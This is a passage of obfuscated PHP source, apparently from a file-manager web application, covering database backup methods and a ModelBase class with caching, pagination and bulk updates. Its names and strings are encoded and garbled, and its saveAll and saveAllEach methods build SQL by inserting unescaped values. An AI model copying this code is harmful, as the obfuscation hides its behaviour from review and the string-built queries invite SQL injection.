$dæƒÛº‘¼)) { continue; } Model($E¸½ö£·ù[702])->remove($C«ÅÍãÆ²Ù[$E¸½ö£·ù[393]]); $aÉ¨°İ…™ã = $this->backupPath($F¿¾Ğ“ÔÚ“, $A°é“Õá©Ë); IO::remove($aÉ¨°İ…™ã, !1); } goto cœ˜¹É„Â±; aÊÖ¡éÔº‘: $E¸½ö£·ù =& $_SERVER[æ§›¦ÌáØ]; if (self::$manual == 1) { return; } $AÕš÷÷ÈÖÁ = Model($E¸½ö£·ù[702])->listData(); goto D‚ª¹¾ãëÜ; cœ˜¹É„Â±: } private function backupPath($dƒÂ–ÏÄ›, $a¾íá™‘›ç = false) { $e‚–ÊŸÑÒ =& $_SERVER[æ§›¦ÌáØ]; if (!$a¾íá™‘›ç) { $a¾íá™‘›ç = Model($e‚–ÊŸÑÒ[723])->get($e‚–ÊŸÑÒ[724]); } $B’Á„ÅÉŞœ = $dƒÂ–ÏÄ›[$e‚–ÊŸÑÒ[28]]; $aŠùÜÆõŸØ = substr(md5($e‚–ÊŸÑÒ[725] . $a¾íá™‘›ç . $B’Á„ÅÉŞœ), 0, 8); return "\x7b\x69\157\72{$dƒÂ–ÏÄ›[$e‚–ÊŸÑÒ[705]]}\175\57\144\141\164\x61\x62\x61\163\x65\57\142\x61\143\153\165\x70\x2f" . $B’Á„ÅÉŞœ . $e‚–ÊŸÑÒ[71] . $aŠùÜÆõŸØ; } public function db() { goto AäÉ‹‚Ù¹Æ; Eİ·”—»ï: $eƒÏ‚õ—Œ¨ = new BackupDb(); if (!$eƒÏ‚õ—Œ¨->index()) { return !1; } self::set(array($B¢ø«³®Úà[726] => 1)); goto a¨ÄìëŠˆÍ; a¨ÄìëŠˆÍ: return !0; goto cˆæä¼®ØŒ; AäÉ‹‚Ù¹Æ: $B¢ø«³®Úà =& $_SERVER[æ§›¦ÌáØ]; $aë§Öå™á = self::get(); if ($aë§Öå™á[$B¢ø«³®Úà[291]][$B¢ø«³®Úà[711]][$B¢ø«³®Úà[703]] == $B¢ø«³®Úà[87]) { return !0; } goto Eİ·”—»ï; cˆæä¼®ØŒ: } public function dbFile() { goto BâÜŸÔˆœÌ; BâÜŸÔˆœÌ: $DÌÓÛšİÁ¤ =& $_SERVER[æ§›¦ÌáØ]; $dê×ñğÊ = self::get(); if ($dê×ñğÊ[$DÌÓÛšİÁ¤[291]][$DÌÓÛšİÁ¤[715]][$DÌÓÛšİÁ¤[703]] == $DÌÓÛšİÁ¤[87]) { return !0; } goto F‡ùğî»¼ê; a…§ÀÓáß´: return !0; goto Aİö„¶ï«; F‡ùğî»¼ê: $CŒÈÌÊÏ = new BackupDbFile(); if (!$CŒÈÌÊÏ->index()) { return !1; } self::set(array($DÌÓÛšİÁ¤[727] => 1)); goto a…§ÀÓáß´; Aİö„¶ï«: } public function file() { $C¤—¨§åÊ =& $_SERVER[æ§›¦ÌáØ]; $cïæªÓ = self::get(); if ($cïæªÓ[$C¤—¨§åÊ[291]][$C¤—¨§åÊ[193]][$C¤—¨§åÊ[703]] == $C¤—¨§åÊ[87]) { return !0; } if (!isset($cïæªÓ[$C¤—¨§åÊ[708]]) || $cïæªÓ[$C¤—¨§åÊ[708]] == $C¤—¨§åÊ[191]) { $fö¨´„»š = new BackupFile(); if (!$fö¨´„»š->index()) { return !1; } } self::set(array($C¤—¨§åÊ[728] => 1, $C¤—¨§åÊ[703] => 1)); return !0; } } goto CÏ®ŞÈÇÔ; bÇïó¯áÊ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\x54\151\x6d\x65", "\164\x69\x6d\145", "\x69\156\163\x65\x72\164\54\165\160\x64\141\x74\145", "\146\x75\x6e\x63\164\x69\x6f\156"), array("\x63\x72\145\x61\x74\x65\124\x69\x6d\x65", "\x74\x69\155\x65", "\151\156\x73\145\162\164", "\x66\165\x6e\143\x74\151\157\x6e")); public function setDataAuto($DÈÊƒ“¶Ù) { $this->dataAuto = $DÈÊƒ“¶Ù; } public function __construct($a£»ïÁ±¹§ = '', $D¶İš½Š‹ = '', $F±’Êß†ùÊ = '') { parent::__construct($a£»ïÁ±¹§, $D¶İš½Š‹, $F±’Êß†ùÊ); } protected $tableMeta = array(); protected function _beforeInsert(&$fÅ¶¾‚ÛÆ», $B‡„¶«ôé) { $Bš§ãÏøó =& $_SERVER[æ§›¦ÌáØ]; if (!$this->checkDataAutoHas($Bš§ãÏøó[353])) { return; } $this->dataBeforeFilter($fÅ¶¾‚ÛÆ», $Bš§ãÏøó[353]); } protected function _beforeUpdate(&$BÇ¦òäêĞ , $d“˜£Ä™„) { $FÂÑœ‘ñè =& $_SERVER[æ§›¦ÌáØ]; if (!$this->checkDataAutoHas($FÂÑœ‘ñè[354])) { return; } $this->dataBeforeFilter($BÇ¦òäêĞ , $FÂÑœ‘ñè[354]); } protected function _afterSelect(&$E™õƒ…÷†, $f·È­Ã¥) { if (!is_array($E™õƒ…÷†)) { return; } if (!$this->checkDataAutoHas($_SERVER[æ§›¦ÌáØ][355])) { return; } foreach ($E™õƒ…÷† as &$fääçğïÙ) { $this->dataAfterFilter($fääçğïÙ); } unset($fääçğïÙ); } protected function _afterFind(&$báÕÖÁô‰, $C„è™´ùª£) { if (!is_array($báÕÖÁô‰)) { return; } if (!$this->checkDataAutoHas($_SERVER[æ§›¦ÌáØ][355])) { return; } $this->dataAfterFilter($báÕÖÁô‰); } public static function textEncode($eé‚ó¤ˆ¾Š) { if (!$eé‚ó¤ˆ¾Š) { return $eé‚ó¤ˆ¾Š; } $D” µ„¹÷ª = json_encode($eé‚ó¤ˆ¾Š); $D” µ„¹÷ª = preg_replace_callback($_SERVER[æ§›¦ÌáØ][356], function ($A´æ‚¿à¥) { return addslashes($A´æ‚¿à¥[0]); }, $D” µ„¹÷ª); return json_decode($D” µ„¹÷ª); } public static function textDecode($aÙ©ÁÆ¢”) { $Bâ¿£Á¼µ =& $_SERVER[æ§›¦ÌáØ]; $E ËÄîŒ…Í = json_encode($aÙ©ÁÆ¢”); $E ËÄîŒ…Í = preg_replace_callback($Bâ¿£Á¼µ[357], function ($eÁˆ±â„‚) { return $_SERVER[æ§›¦ÌáØ][97]; }, $E ËÄîŒ…Í); return json_decode($E ËÄîŒ…Í); } public function setAutoIncrement($fÅ¦êÅ¬†à) { $CšËÌ©ã†… = array($this->getPk() => $fÅ¦êÅ¬†à); $aÑ‚ÀÇ¥ä¸ = $this->data($CšËÌ©ã†…)->add(); if ($aÑ‚ÀÇ¥ä¸) { $this->delete($aÑ‚ÀÇ¥ä¸); } } public function getAutoIncrement() { $bóÜ©¹Ã®– = $this->getTableName(); $bŠòƒ‡‚¾± = $this->max($this->getPk()); $C‡ÉÜ Íˆ· = $this->query("\163\x68\x6f\x77\x20\164\141\x62\154\145\40\163\x74\141\164\x75\163\x20\x77\x68\x65\162\145\x20\x4e\141\155\x65\75\47{$bóÜ©¹Ã®–}\47"); $fêñÄëÕÑæ = $C‡ÉÜ Íˆ·[0][$_SERVER[æ§›¦ÌáØ][358]]; $a‰àòøÂùÒ = max($bŠòƒ‡‚¾±, $fêñÄëÕÑæ); return $a‰àòøÂùÒ; } protected function _callBefore($C‰ÂÅÄä­, $d›áÒñ¶Å•) { return $this->cacheCallCheck($C‰ÂÅÄä­, $d›áÒñ¶Å•, !1); } protected function _callAfter($Dçğá¬ĞÃÖ, $fÊÈ¦ÜÒ“) { return $this->cacheCallCheck($Dçğá¬ĞÃÖ, $fÊÈ¦ÜÒ“, !0); } protected function cacheFunctionAlias($dğÙîÆ¶™µ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($D Ì¬±†´¹, $cÇƒ‹¾¡Ûä, $dˆ­®·á¶ˆ = false) { $EøÚœ—í‚… = $this->cacheFunctionAlias($cÇƒ‹¾¡Ûä); if (!$EøÚœ—í‚…) { return; } foreach ($EøÚœ—í‚… as $Fò‰Á†•“ƒ => $B‹‘í©ĞÌ—) { $c÷ÙéËâÀñ = $B‹‘í©ĞÌ—[0]; $a®ö½‹¤ğ = explode($_SERVER[æ§›¦ÌáØ][47], $B‹‘í©ĞÌ—[1]); if ($D Ì¬±†´¹ == $Fò‰Á†•“ƒ) { return $this->cacheFunctionGet($Fò‰Á†•“ƒ, $c÷ÙéËâÀñ); } if ($dˆ­®·á¶ˆ && in_array($D Ì¬±†´¹, $a®ö½‹¤ğ)) { $this->cacheFunctionClear($Fò‰Á†•“ƒ, $c÷ÙéËâÀñ); } } } public function cacheFunctionGet($cÛÍÈÃ‰‚±, $f–Ë´éÆ‡¤) { $bÁ†¹‚É¦´ = $this->cacheKeyMake($cÛÍÈÃ‰‚±, $f–Ë´éÆ‡¤); $AéÜª®Îö´ = Cache::get($bÁ†¹‚É¦´); if (!is_array($AéÜª®Îö´)) { $AéÜª®Îö´ = call_user_func_array(array($this, $cÛÍÈÃ‰‚±), array($f–Ë´éÆ‡¤, !0)); Cache::set($bÁ†¹‚É¦´, $AéÜª®Îö´); } return $AéÜª®Îö´; } public function cacheFunctionClear($fï®£…Êâ, $dó­Îæä¬) { $dÑßÅµÇ® = $dó­Îæä¬; if (!is_array($dó­Îæä¬)) { $dÑßÅµÇ® = array($dó­Îæä¬); } foreach ($dÑßÅµÇ® as $fš«“ŠÒ“×) { $Añ÷åÚğĞî = $this->cacheKeyMake($fï®£…Êâ, $fš«“ŠÒ“×); Cache::remove($Añ÷åÚğĞî); } } private function cacheKeyMake($E¹Ò¾ä–¾Ÿ, $f°…›Ô…£») { $B¢ğ¯ãêßÁ =& $_SERVER[æ§›¦ÌáØ]; return get_class($this) . $B¢ğ¯ãêßÁ[71] . $E¹Ò¾ä–¾Ÿ . $B¢ğ¯ãêßÁ[359] . $f°…›Ô…£»; } protected function selectPageReset() { $AÔ¨‹¤ŸŠ =& $_SERVER[æ§›¦ÌáØ]; if (isset($GLOBALS[$AÔ¨‹¤ŸŠ[360]])) { return; } $GLOBALS[$AÔ¨‹¤ŸŠ[360]] = isset($GLOBALS[$AÔ¨‹¤ŸŠ[7]][$AÔ¨‹¤ŸŠ[361]]) ? $GLOBALS[$AÔ¨‹¤ŸŠ[7]][$AÔ¨‹¤ŸŠ[361]] : !1; $GLOBALS[$AÔ¨‹¤ŸŠ[362]] = isset($GLOBALS[$AÔ¨‹¤ŸŠ[7]][$AÔ¨‹¤ŸŠ[351]]) ? $GLOBALS[$AÔ¨‹¤ŸŠ[7]][$AÔ¨‹¤ŸŠ[351]] : !1; $GLOBALS[$AÔ¨‹¤ŸŠ[7]][$AÔ¨‹¤ŸŠ[361]] = !1; $GLOBALS[$AÔ¨‹¤ŸŠ[7]][$AÔ¨‹¤ŸŠ[351]] = !1; } protected function selectPageRestore() { $Bá’Çù¼ó =& $_SERVER[æ§›¦ÌáØ]; if (!isset($GLOBALS[$Bá’Çù¼ó[360]])) { return; } $GLOBALS[$Bá’Çù¼ó[7]][$Bá’Çù¼ó[361]] = $GLOBALS[$Bá’Çù¼ó[360]]; $GLOBALS[$Bá’Çù¼ó[7]][$Bá’Çù¼ó[351]] = $GLOBALS[$Bá’Çù¼ó[362]]; unset($GLOBALS[$Bá’Çù¼ó[360]]); unset($GLOBALS[$Bá’Çù¼ó[362]]); } protected function selectPage($aİÜñÏ¢†ñ = 200, $b­Ùæ» Ë = 1) { goto C»ÕµòÊÙ; F£¹Õù³: return $Aî÷ì¸’¤; goto C¦İ¯°ƒªÍ; BÑ¾¹ÖçÉõ: $A¤Ôô”Š = 50000; $aİÜñÏ¢†ñ = isset($in[$cÔ¸®Œ—øÇ[361]]) && $in[$cÔ¸®Œ—øÇ[361]] ? $in[$cÔ¸®Œ—øÇ[361]] : $aİÜñÏ¢†ñ; if ($aİÜñÏ¢†ñ === -1) { $in[$cÔ¸®Œ—øÇ[361]] = !1; $A¤Ôô”Š = 100000000; $aİÜñÏ¢†ñ = $A¤Ôô”Š; } goto eÛîóÑÆ‹’; e¥Î”âÑâ: if (!is_array($F‘ÖÑš°¹)) { $F‘ÖÑš°¹ = array(); } if ($B¾æ¡„óì == 1) { $A™êã‹×™Ñ = count($F‘ÖÑš°¹); } $Aî÷ì¸’¤ = array($cÔ¸®Œ—øÇ[364] => array($cÔ¸®Œ—øÇ[365] => $A™êã‹×™Ñ, $cÔ¸®Œ—øÇ[361] => $aİÜñÏ¢†ñ, $cÔ¸®Œ—øÇ[351] => $b­Ùæ» Ë, $cÔ¸®Œ—øÇ[366] => $B¾æ¡„óì), $cÔ¸®Œ—øÇ[367] => $F‘ÖÑš°¹); goto F£¹Õù³; eÛîóÑÆ‹’: $EË‰ÜÙ©êî = $aª¾‰ŞÏÂ‰; $EË‰ÜÙ©êî[$cÔ¸®Œ—øÇ[363]] = array(); $aİÜñÏ¢†ñ = intval($aİÜñÏ¢†ñ); goto d†¼ê±İ’; d†¼ê±İ’: $aİÜñÏ¢†ñ = $aİÜñÏ¢†ñ <= 5 ? 5 : ($aİÜñÏ¢†ñ >= $A¤Ôô”Š ? $A¤Ôô”Š : $aİÜñÏ¢†ñ); $b­Ùæ» Ë = intval(isset($in[$cÔ¸®Œ—øÇ[351]]) && $in[$cÔ¸®Œ—øÇ[351]] ? $in[$cÔ¸®Œ—øÇ[351]] : $b­Ùæ» Ë); $b­Ùæ» Ë = $b­Ùæ» Ë <= 1 ? 1 : $b­Ùæ» Ë; goto AÊƒš±›…; AÊƒš±›…: $F‘ÖÑš°¹ = array(); $BàáŠ¨«À° = 1; if ($b­Ùæ» Ë == 1 && $BàáŠ¨«À°) { $this->optionsValue($aª¾‰ŞÏÂ‰); $F‘ÖÑš°¹ = $this->page($b­Ùæ» Ë, $aİÜñÏ¢†ñ)->select(); $A™êã‹×™Ñ = is_array($F‘ÖÑš°¹) ? count($F‘ÖÑš°¹) : 0; if ($A™êã‹×™Ñ < $aİÜñÏ¢†ñ) { $B¾æ¡„óì = 1; } else { $this->optionsValue($EË‰ÜÙ©êî); $A™êã‹×™Ñ = intval($this->count()); $B¾æ¡„óì = ceil($A™êã‹×™Ñ / $aİÜñÏ¢†ñ); } } else { $this->optionsValue($EË‰ÜÙ©êî); $A™êã‹×™Ñ = intval($this->count()); $B¾æ¡„óì = ceil($A™êã‹×™Ñ / $aİÜñÏ¢†ñ); $b­Ùæ» Ë = $b­Ùæ» Ë >= $B¾æ¡„óì ? $B¾æ¡„óì : $b­Ùæ» Ë; $this->optionsValue($aª¾‰ŞÏÂ‰); $F‘ÖÑš°¹ = $this->page($b­Ùæ» Ë, $aİÜñÏ¢†ñ)->select(); } goto e¥Î”âÑâ; C»ÕµòÊÙ: $cÔ¸®Œ—øÇ =& $_SERVER[æ§›¦ÌáØ]; global $in; $aª¾‰ŞÏÂ‰ = $this->optionsValue(); goto BÑ¾¹ÖçÉõ; C¦İ¯°ƒªÍ: } protected function checkLength($C÷¥ã¡ó, $FòêÓæ ¸â = 0, $cæ‡¦¼Ûœ¦ = '') { $CğÎ‰á‘” =& $_SERVER[æ§›¦ÌáØ]; $FòêÓæ ¸â = $FòêÓæ ¸â ? $FòêÓæ ¸â : 65536; if (!$C÷¥ã¡ó || strlen($C÷¥ã¡ó) < $FòêÓæ ¸â) { return; } $cæ‡¦¼Ûœ¦ = $cæ‡¦¼Ûœ¦ ? $cæ‡¦¼Ûœ¦ . $CğÎ‰á‘”[68] : $CğÎ‰á‘”[33]; show_json($cæ‡¦¼Ûœ¦ . LNG($CğÎ‰á‘”[368]) . "\50{$FòêÓæ ¸â}\x29", !1); } protected function metaSet($Eïƒô©åË, $e¸ÃùéÆí” = null, $e°Å›ÀÁˆ = null) { goto b”´Åİ‚Á; Bá–ÁŒíƒâ: $D½Ÿ ®ŞÂ = $aŠ‡¼Œ¶µµ[373] . $this->tableMeta; CacheLock::lock($D½Ÿ ®ŞÂ); $aé²»ÌŸÖÃ->where(array($f·å¾¯ˆ“‚ => $Eïƒô©åË))->addAll($bÂ¡îôÓœ, array(), !0); goto d¶ƒÎßìØï; bå§«·÷Şµ: if (is_string($e¸ÃùéÆí”)) { $aõÅÍÂï‡é[$e¸ÃùéÆí”] = $e°Å›ÀÁˆ; } $bÂ¡îôÓœ = array(); foreach ($aõÅÍÂï‡é as $DÍ÷øò²³Ò => $dÀ½¼„ëÜØ) { $this->checkLength($dÀ½¼„ëÜØ, !1, $B•ŞŒ¸¯Ø“ . $aŠ‡¼Œ¶µµ[4] . $DÍ÷øò²³Ò); $bÂ¡îôÓœ[] = array($f·å¾¯ˆ“‚ => $Eïƒô©åË, $aŠ‡¼Œ¶µµ[93] => $DÍ÷øò²³Ò, $aŠ‡¼Œ¶µµ[372] => $dÀ½¼„ëÜØ); } goto Bá–ÁŒíƒâ; b”´Åİ‚Á: $aŠ‡¼Œ¶µµ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->tableMeta || !$Eïƒô©åË) { return !1; } $f·å¾¯ˆ“‚ = $this->tableMeta[$aŠ‡¼Œ¶µµ[369]]; goto E˜…•…âŠ°; E˜…•…âŠ°: $B•ŞŒ¸¯Ø“ = $this->tableMeta[$aŠ‡¼Œ¶µµ[370]]; $aé²»ÌŸÖÃ = Model($B•ŞŒ¸¯Ø“); $c˜¥®ñ÷Ë = array($f·å¾¯ˆ“‚ => $Eïƒô©åË, $aŠ‡¼Œ¶µµ[371] => $e¸ÃùéÆí”); goto DßÂÈˆ²‡; d¶ƒÎßìØï: CacheLock::unlock($D½Ÿ ®ŞÂ); return !0; goto AêƒŠ ¬”Ï; DßÂÈˆ²‡: if (is_null($e¸ÃùéÆí”)) { return $aé²»ÌŸÖÃ->where(array($f·å¾¯ˆ“‚ => $Eïƒô©åË))->delete(); } if (is_null($e°Å›ÀÁˆ) && is_string($e¸ÃùéÆí”)) { return $aé²»ÌŸÖÃ->where($c˜¥®ñ÷Ë)->delete(); } $aõÅÍÂï‡é = is_array($e¸ÃùéÆí”) ? $e¸ÃùéÆí” : array(); goto bå§«·÷Şµ; AêƒŠ ¬”Ï: } public function metaGet($C‰¥µæ¦´¥, $BĞêˆĞ’Î’ = false) { goto Eìé”ÚĞ¥; a†¯¥åŸÖÅ: $A¤ êÍİñù = Model($this->tableMeta[$b…¡£Êá•[370]]); if ($BĞêˆĞ’Î’) { $Aã„ğ§¶Ç = array($BØÕÀª†İ => $C‰¥µæ¦´¥, $b…¡£Êá•[93] => $BĞêˆĞ’Î’); return $A¤ êÍİñù->where($Aã„ğ§¶Ç)->getField($b…¡£Êá•[372]); } $Aã„ğ§¶Ç = array($BØÕÀª†İ => $C‰¥µæ¦´¥); goto Döæ½½ØŒæ; Döæ½½ØŒæ: $E§¦ÎŠÒëĞ = $A¤ êÍİñù->field($b…¡£Êá•[374])->where($Aã„ğ§¶Ç)->select(); $E§¦ÎŠÒëĞ = array_to_keyvalue($E§¦ÎŠÒëĞ, $b…¡£Êá•[93], $b…¡£Êá•[372]); return $E§¦ÎŠÒëĞ; goto BŠÆ´¹„Œ; Eìé”ÚĞ¥: $b…¡£Êá• =& $_SERVER[æ§›¦ÌáØ]; if (!$this->tableMeta) { return array(); } $BØÕÀª†İ = $this->tableMeta[$b…¡£Êá•[369]]; goto a†¯¥åŸÖÅ; BŠÆ´¹„Œ: } private function checkDataAutoHas($C¸–ˆøÀ‹ã) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $dÒ‚ï¯¯) { if (in_array($C¸–ˆøÀ‹ã, explode($_SERVER[æ§›¦ÌáØ][47], $dÒ‚ï¯¯[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$b ñ ¤ÆÁ©, $A°éù¬Õã) { $FõˆÓ´Û»Ç =& $_SERVER[æ§›¦ÌáØ]; foreach ($this->dataAuto as $cÇ‡Îö³ç÷) { $E•ÅŠÏ±à = $cÇ‡Îö³ç÷[0]; if (!in_array($A°éù¬Õã, explode($FõˆÓ´Û»Ç[47], $cÇ‡Îö³ç÷[2]))) { continue; } switch (trim($cÇ‡Îö³ç÷[3])) { case $FõˆÓ´Û»Ç[319]: case $FõˆÓ´Û»Ç[320]: $d¹—’ïñ¯Œ = $cÇ‡Îö³ç÷[1]; $a‚—º©³éÌ = isset($cÇ‡Îö³ç÷[4]) ? (array) $cÇ‡Îö³ç÷[4] : array(); if ($d¹—’ïñ¯Œ == $FõˆÓ´Û»Ç[197] && array_key_exists($E•ÅŠÏ±à, $b ñ ¤ÆÁ©)) { if (!$b ñ ¤ÆÁ©[$E•ÅŠÏ±à]) { unset($b ñ ¤ÆÁ©[$E•ÅŠÏ±à]); } break; } if (isset($b ñ ¤ÆÁ©[$E•ÅŠÏ±à])) { array_unshift($a‚—º©³éÌ, $b ñ ¤ÆÁ©[$E•ÅŠÏ±à]); } if ($FõˆÓ´Û»Ç[319] == $cÇ‡Îö³ç÷[3]) { $b ñ ¤ÆÁ©[$E•ÅŠÏ±à] = call_user_func_array($d¹—’ïñ¯Œ, $a‚—º©³éÌ); } else { $b ñ ¤ÆÁ©[$E•ÅŠÏ±à] = call_user_func_array(array(&$this, $d¹—’ïñ¯Œ), $a‚—º©³éÌ); } break; case $FõˆÓ´Û»Ç[271]: $b ñ ¤ÆÁ©[$E•ÅŠÏ±à] = $b ñ ¤ÆÁ©[$cÇ‡Îö³ç÷[1]]; break; case $FõˆÓ´Û»Ç[292]: if (isset($b ñ ¤ÆÁ©[$E•ÅŠÏ±à]) && !is_string($b ñ ¤ÆÁ©[$E•ÅŠÏ±à])) { $b ñ ¤ÆÁ©[$E•ÅŠÏ±à] = json_encode_force($b ñ ¤ÆÁ©[$E•ÅŠÏ±à]); } break; case $FõˆÓ´Û»Ç[321]: if ($b ñ ¤ÆÁ©[$E•ÅŠÏ±à] === $FõˆÓ´Û»Ç[33]) { unset($b ñ ¤ÆÁ©[$E•ÅŠÏ±à]); } break; case $FõˆÓ´Û»Ç[322]: $b ñ ¤ÆÁ©[$E•ÅŠÏ±à] = $cÇ‡Îö³ç÷[1]; default: break; } } if ($A°éù¬Õã == $FõˆÓ´Û»Ç[353]) { $b†¡’öÅì‘ = strtolower($this->db->getDbType()); if (strpos($b†¡’öÅì‘, $FõˆÓ´Û»Ç[9]) !== 0) { return; } $F„£«‡¡Ç = $this->field(!0)->fields; $f º¢‰­‹¹ = $F„£«‡¡Ç[$FõˆÓ´Û»Ç[250]]; if (isset($F„£«‡¡Ç[$FõˆÓ´Û»Ç[249]])) { unset($f º¢‰­‹¹[$F„£«‡¡Ç[$FõˆÓ´Û»Ç[249]]]); } foreach ($f º¢‰­‹¹ as $eÉ¡™ö„‰ => $A°éù¬Õã) { if (!isset($b ñ ¤ÆÁ©[$eÉ¡™ö„‰])) { $b ñ ¤ÆÁ©[$eÉ¡™ö„‰] = $FõˆÓ´Û»Ç[33]; } } } } private function dataAfterFilter(&$eßˆ¿ Æï¼) { $Dé ËÉè =& $_SERVER[æ§›¦ÌáØ]; foreach ($this->dataAuto as $Bç††÷åÒ£) { $dæõõ‘   = $Bç††÷åÒ£[0]; if (!in_array($Dé ËÉè[355], explode($Dé ËÉè[47], $Bç††÷åÒ£[2]))) { continue; } if (!isset($eßˆ¿ Æï¼[$dæõõ‘  ])) { continue; } switch (trim($Bç††÷åÒ£[3])) { case $Dé ËÉè[319]: case $Dé ËÉè[320]: $fíòñÖÊé = isset($Bç††÷åÒ£[4]) ? (array) $Bç††÷åÒ£[4] : array(); array_unshift($fíòñÖÊé, $eßˆ¿ Æï¼[$dæõõ‘  ]); if ($Dé ËÉè[319] == $Bç††÷åÒ£[3]) { $eßˆ¿ Æï¼[$dæõõ‘  ] = call_user_func_array($Bç††÷åÒ£[1], $fíòñÖÊé); } else { $eßˆ¿ Æï¼[$dæõõ‘  ] = call_user_func_array(array(&$this, $Bç††÷åÒ£[1]), $fíòñÖÊé); } break; case $Dé ËÉè[271]: $eßˆ¿ Æï¼[$dæõõ‘  ] = $eßˆ¿ Æï¼[$Bç††÷åÒ£[1]]; break; case $Dé ËÉè[292]: $f¸¶ï’İá‘ = $eßˆ¿ Æï¼[$dæõõ‘  ]; $eßˆ¿ Æï¼[$dæõõ‘  ] = json_decode($f¸¶ï’İá‘, !0); if (is_null($eßˆ¿ Æï¼[$dæõõ‘  ])) { $eßˆ¿ Æï¼[$dæõõ‘  ] = $f¸¶ï’İá‘; } break; case $Dé ËÉè[321]: if ($eßˆ¿ Æï¼[$dæõõ‘  ] === $Dé ËÉè[33]) { unset($eßˆ¿ Æï¼[$dæõõ‘  ]); } break; case $Dé ËÉè[322]: $eßˆ¿ Æï¼[$dæõõ‘  ] = $Bç††÷åÒ£[1]; default: break; } } } public function saveAll($Aêåîìªœ®) { goto E–ÀùÈ×Ì‡; Fš´ÆºÛ¢Š: $Aêåîìªœ® = is_array($Aêåîìªœ®) ? $Aêåîìªœ® : array(); $FŞ¥Õï° = $F…æ¥÷Ø[375]; $eáŠÚÍØäõ = 0; goto dÁ¯èÈğ; E–ÀùÈ×Ì‡: $F…æ¥÷Ø =& $_SERVER[æ§›¦ÌáØ]; $FÅÃ‚’œ²­ = $this->tablePrefix . $this->tableName; $D—¶¶ÍÁò† = self::SQL_WHERE_IN_CHUNK; goto Fš´ÆºÛ¢Š; F„ÓµÂƒ±„: $this->chunkEventSet(); goto FèÏˆÓÚ™; dÁ¯èÈğ: $c·Õ¬Í‹à” = array(); $CõçÊ…ğó˜ = count($Aêåîìªœ®); for ($FèõÊÄ½‰Ä = 0; $FèõÊÄ½‰Ä < $CõçÊ…ğó˜; $FèõÊÄ½‰Ä++) { $FöÄ¿Æ¼À = $Aêåîìªœ®[$FèõÊÄ½‰Ä]; if (!is_array($FöÄ¿Æ¼À) || count($FöÄ¿Æ¼À) != 4) { continue; } $BŸóˆ¿Ì»Ø = "\125\x50\x44\x41\x54\105\40\140{$FÅÃ‚’œ²­}\140\40\x53\105\x54\x20{$FöÄ¿Æ¼À[2]}\40\x3d\40\x43\101\x53\x45\x20{$FöÄ¿Æ¼À[0]}\40\xa"; if ($eáŠÚÍØäõ == 0) { $FŞ¥Õï° = $BŸóˆ¿Ì»Ø; } $c·Õ¬Í‹à”[] = $F…æ¥÷Ø[116] . $FöÄ¿Æ¼À[1] . $F…æ¥÷Ø[116]; $eáŠÚÍØäõ++; $FŞ¥Õï° .= "\x20\x57\x48\105\116\40\x27{$FöÄ¿Æ¼À[1]}\47\40\x54\110\105\116\40\x27{$FöÄ¿Æ¼À[3]}\47\40\12"; if ($eáŠÚÍØäõ == $D—¶¶ÍÁò† || $FèõÊÄ½‰Ä == $CõçÊ…ğó˜ - 1) { goto B¥ÛÂÇá¹; B¥ÛÂÇá¹: $dœÃÌ•¸ÑÒ = implode($F…æ¥÷Ø[47], $c·Õ¬Í‹à”); $FŞ¥Õï° .= "\x20\x45\x4e\x44\40\40\127\x48\105\122\x45\x20{$FöÄ¿Æ¼À[0]}\x20\111\x4e\40\50{$dœÃÌ•¸ÑÒ}\x29\x20"; $this->execute($FŞ¥Õï°); goto eíšÄà; eíšÄà: $eáŠÚÍØäõ = 0; $FŞ¥Õï° = $BŸóˆ¿Ì»Ø; $this->chunkEventCheck(count($c·Õ¬Í‹à”)); goto dï†°è‡‰¡; dï†°è‡‰¡: $c·Õ¬Í‹à” = array(); goto B¸ĞÖ‹ö­µ; B¸ĞÖ‹ö­µ: } } goto F„ÓµÂƒ±„; FèÏˆÓÚ™: } public function saveAllEach($aã§¬é±Ş) { $C„ÒË×ã¦ =& $_SERVER[æ§›¦ÌáØ]; $d…‹à¤‡¨ = $this->tablePrefix . $this->tableName; foreach ($aã§¬é±Ş as $bß’†–å÷) { if (!is_array($bß’†–å÷) || count($bß’†–å÷) != 4) { continue; } $E±ÈòåÔô© = $bß’†–å÷[0] . $C„ÒË×ã¦[376] . $bß’†–å÷[1] . $C„ÒË×ã¦[116]; $AĞÓÄ øáÏ = $bß’†–å÷[2] . $C„ÒË×ã¦[376] . $bß’†–å÷[3] . $C„ÒË×ã¦[116]; $Dğ±ùÉ¼ = "\165\160\144\141\x74\x65\40{$d…‹à¤‡¨}\40\163\x65\164\x20{$AĞÓÄ øáÏ}\40\167\150\145\x72\x65\x20{$E±ÈòåÔô©}\73"; $this->execute($Dğ±ùÉ¼); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($d—‰Âö·ƒ¶ = false, $D†šÉ¦¶ˆœ = false) { $this->_chunkEvent = $d—‰Âö·ƒ¶; $this->_chunkEventParam = $D†šÉ¦¶ˆœ; } private function chunkEventCheck($dÃæò«¾Ç“) { if (!$this->_chunkEvent) { return; } $D«Ÿ°‡íĞ¡ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $D«Ÿ°‡íĞ¡[$_SERVER[æ§›¦ÌáØ][377]] = $dÃæò«¾Ç“; Hook::trigger($this->_chunkEvent, $D«Ÿ°‡íĞ¡); } public function addAll($DÕ“èƒ¨ „, $C“›Üùš¸Á = array(), $dÉÔÁÌöÑ = false) { goto A™ñ‰İ™; aÚµ„¤­Ò²: if (method_exists($this->db, $D™àÕÚÃ˜[270])) { for ($b—¾’Æª‹í = 0; $b—¾’Æª‹í < count($DÕ“èƒ¨ „); $b—¾’Æª‹í += $Bë¾İİìí­) { $dÉ’•Ó“øÄ = array_slice($DÕ“èƒ¨ „, $b—¾’Æª‹í, $Bë¾İİìí­); if (!is_array($dÉ’•Ó“øÄ) || count($dÉ’•Ó“øÄ) == 0) { break; } $Dè»­œÜåÒ = $this->db->insertAll($dÉ’•Ó“øÄ, $C“›Üùš¸Á, $dÉÔÁÌöÑ); $this->chunkEventCheck(count($dÉ’•Ó“øÄ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($DÕ“èƒ¨ „ as $fˆ—å× => 